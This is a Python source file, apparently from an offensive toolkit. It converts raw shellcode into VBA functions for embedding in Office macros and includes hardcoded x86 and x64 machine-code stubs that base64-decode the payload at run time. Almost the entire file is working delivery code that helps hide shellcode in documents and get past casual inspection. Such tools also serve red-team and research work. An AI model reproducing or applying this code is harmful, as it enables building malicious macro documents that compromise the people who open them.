#!/usr/bin/env python

import optparse
import base64
import io

def Shellcode2VBAFunc(payload, arch, output_funcname, encoding=None):

    #print("\n=====================\nShellcode2VBAFunc\n=====================\n")
    #print("len(payload):    %d" % len(payload))
    #print("arch:            %s" % arch)
    #print("output_funcname: %s" % output_funcname)
    #print("encoding:        %s" % encoding)
    
    if encoding == 'base64':
        # To simplify the base64 shellcode decoder, we make the payload's size a multiple of 3
        # by padding with 0-bytes and mark the end of the base64 string with character =
        if len(payload) > 0:
            payloadLenMod3 = len(payload) % 3
            if payloadLenMod3 > 0:
                payload += b'\x00' * (3 - payloadLenMod3)
            payload = base64.standard_b64encode(payload) + b'='
            #print("encoded len(payload):    %d\n" % len(payload))
                
    countLine = 0
    countSubs = 1
    line = ''

    outfile = io.StringIO()
    
    if len(payload) > 0:
    
        # If we are using an encoder, prepend it to the payload
        if encoding == 'base64':
            outfile.write('Private Function %s_%d() As String\n' % (output_funcname, countSubs))
            outfile.write('\tDim szShellcode As String\n')
            outfile.write('\n')
            outfile.write('\tszShellcode = ""\n')
            if arch == 'x64':
                #print("%s_%d() is the base64 x64 shellcode decoder\n" % (output_funcname, countSubs))
                outfile.write('\tszShellcode = szShellcode & Chr(&hEB) & Chr(&h3A) & Chr(&h31) & Chr(&hD2) & Chr(&h80) & Chr(&h3B) & Chr(&h2B) & Chr(&h75) & Chr(&h04) & Chr(&hB2) & Chr(&h3E) & Chr(&hEB) & Chr(&h26) & Chr(&h80) & Chr(&h3B) & Chr(&h2F)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&h75) & Chr(&h04) & Chr(&hB2) & Chr(&h3F) & Chr(&hEB) & Chr(&h1D) & Chr(&h80) & Chr(&h3B) & Chr(&h39) & Chr(&h77) & Chr(&h07) & Chr(&h8A) & Chr(&h13) & Chr(&h80) & Chr(&hEA) & Chr(&hFC)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&hEB) & Chr(&h11) & Chr(&h80) & Chr(&h3B) & Chr(&h5A) & Chr(&h77) & Chr(&h07) & Chr(&h8A) & Chr(&h13) & Chr(&h80) & Chr(&hEA) & Chr(&h41) & Chr(&hEB) & Chr(&h05) & Chr(&h8A) & Chr(&h13)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&h80) & Chr(&hEA) & Chr(&h47) & Chr(&hC1) & Chr(&hE0) & Chr(&h06) & Chr(&h08) & Chr(&hD0) & Chr(&h48) & Chr(&hFF) & Chr(&hC3) & Chr(&hC3) & Chr(&h48) & Chr(&h8D) & Chr(&h0D) & Chr(&h30)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&h00) & Chr(&h00) & Chr(&h00) & Chr(&h48) & Chr(&h89) & Chr(&hCB) & Chr(&h31) & Chr(&hC0) & Chr(&h80) & Chr(&h3B) & Chr(&h3D) & Chr(&h74) & Chr(&h26) & Chr(&hE8) & Chr(&hB0) & Chr(&hFF)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&hFF) & Chr(&hFF) & Chr(&hE8) & Chr(&hAB) & Chr(&hFF) & Chr(&hFF) & Chr(&hFF) & Chr(&hE8) & Chr(&hA6) & Chr(&hFF) & Chr(&hFF) & Chr(&hFF) & Chr(&hE8) & Chr(&hA1) & Chr(&hFF) & Chr(&hFF)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&hFF) & Chr(&h86) & Chr(&hC4) & Chr(&hC1) & Chr(&hC0) & Chr(&h10) & Chr(&h86) & Chr(&hC4) & Chr(&hC1) & Chr(&hC8) & Chr(&h08) & Chr(&h89) & Chr(&h01) & Chr(&h48) & Chr(&h83) & Chr(&hC1)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&h03) & Chr(&hEB) & Chr(&hD3)\n')
            else:
                #print("%s_%d() is the base64 x86 shellcode decoder\n" % (output_funcname, countSubs))
                outfile.write('\tszShellcode = szShellcode & Chr(&hEB) & Chr(&h3A) & Chr(&h31) & Chr(&hD2) & Chr(&h80) & Chr(&h3B) & Chr(&h2B) & Chr(&h75) & Chr(&h04) & Chr(&hB2)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&h3E) & Chr(&hEB) & Chr(&h26) & Chr(&h80) & Chr(&h3B) & Chr(&h2F) & Chr(&h75) & Chr(&h04) & Chr(&hB2) & Chr(&h3F)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&hEB) & Chr(&h1D) & Chr(&h80) & Chr(&h3B) & Chr(&h39) & Chr(&h77) & Chr(&h07) & Chr(&h8A) & Chr(&h13) & Chr(&h80)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&hEA) & Chr(&hFC) & Chr(&hEB) & Chr(&h11) & Chr(&h80) & Chr(&h3B) & Chr(&h5A) & Chr(&h77) & Chr(&h07) & Chr(&h8A)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&h13) & Chr(&h80) & Chr(&hEA) & Chr(&h41) & Chr(&hEB) & Chr(&h05) & Chr(&h8A) & Chr(&h13) & Chr(&h80) & Chr(&hEA)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&h47) & Chr(&hC1) & Chr(&hE0) & Chr(&h06) & Chr(&h08) & Chr(&hD0) & Chr(&h43) & Chr(&hC3) & Chr(&hEB) & Chr(&h05)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&hE8) & Chr(&hF9) & Chr(&hFF) & Chr(&hFF) & Chr(&hFF) & Chr(&h5B) & Chr(&h31) & Chr(&hC9) & Chr(&h80) & Chr(&hC1)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&h36) & Chr(&h01) & Chr(&hCB) & Chr(&h89) & Chr(&hD9) & Chr(&h31) & Chr(&hC0) & Chr(&h80) & Chr(&h3B) & Chr(&h3D)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&h74) & Chr(&h25) & Chr(&hE8) & Chr(&hAB) & Chr(&hFF) & Chr(&hFF) & Chr(&hFF) & Chr(&hE8) & Chr(&hA6) & Chr(&hFF)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&hFF) & Chr(&hFF) & Chr(&hE8) & Chr(&hA1) & Chr(&hFF) & Chr(&hFF) & Chr(&hFF) & Chr(&hE8) & Chr(&h9C) & Chr(&hFF)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&hFF) & Chr(&hFF) & Chr(&h86) & Chr(&hC4) & Chr(&hC1) & Chr(&hC0) & Chr(&h10) & Chr(&h86) & Chr(&hC4) & Chr(&hC1)\n')
                outfile.write('\tszShellcode = szShellcode & Chr(&hC8) & Chr(&h08) & Chr(&h89) & Chr(&h01) & Chr(&h83) & Chr(&hC1) & Chr(&h03) & Chr(&hEB) & Chr(&hD4)\n')
            outfile.write('\n')
            outfile.write('\t%s_%d = szShellcode\n' % (output_funcname, countSubs))
            outfile.write('End Function\n')
            outfile.write('\n')
            countSubs += 1

        # Iterate through the payload buffer and 
        #  generate a sequence of sub-functions which 
        #  return substrings off the overall payload buffer
        # Each line of the VBA code is limited to 80 characters
        # Each sub-function is limited to 99 lines
        outfile.write('Private Function %s_%d() As String\n' % (output_funcname, countSubs))
        outfile.write('\tDim szShellcode As String\n')
        outfile.write('\n')
        outfile.write('\tszShellcode = ""\n')
        
        for inbyte in payload:
            if len(line) > 0:
                line = line + ' & '
            line = line + 'Chr(%d)' % inbyte
            
            if len(line) >= 80:
                outfile.write('\tszShellcode = szShellcode & %s\n' % line)
                line = ''
                countLine += 1
                if countLine > 99:
                    countLine = 0
                    outfile.write('\n')
                    outfile.write('\t%s_%d = szShellcode\n' % (output_funcname, countSubs))
                    outfile.write('End Function\n')
                    outfile.write('\n')
                    countSubs += 1
                    outfile.write('Private Function %s_%d() As String\n' % (output_funcname, countSubs))
                    outfile.write('\tDim szShellcode As String\n')
                    outfile.write('\n')
                    outfile.write('\tszShellcode = ""\n')

        if len(line) > 0:
            outfile.write('\tszShellcode = szShellcode & %s\n' % line)

        outfile.write('\n')
        outfile.write('\t%s_%d = szShellcode\n' % (output_funcname, countSubs))
        outfile.write('End Function\n')
        outfile.write('\n')
        countSubs += 1
        

    # Create the overall payload buffer by
    #  concatenating the sub-strings returned by
    #  all the sub-functions
    outfile.write('Private Function %s() As Byte()\n' % output_funcname)
    outfile.write('\tDim szShellcode As String\n')
    outfile.write('\n')

    outfile.write('\tszShellcode = ""\n')
    for iIter in range(1, countSubs):
        outfile.write('\tszShellcode = szShellcode & %s_%d()\n' % (output_funcname, iIter))
    outfile.write('\n')
    outfile.write('\t%s = StrConv(szShellcode, vbFromUnicode)\n' % output_funcname)
    outfile.write('End Function\n')
    data = outfile.getvalue()
    outfile.close()
    return data

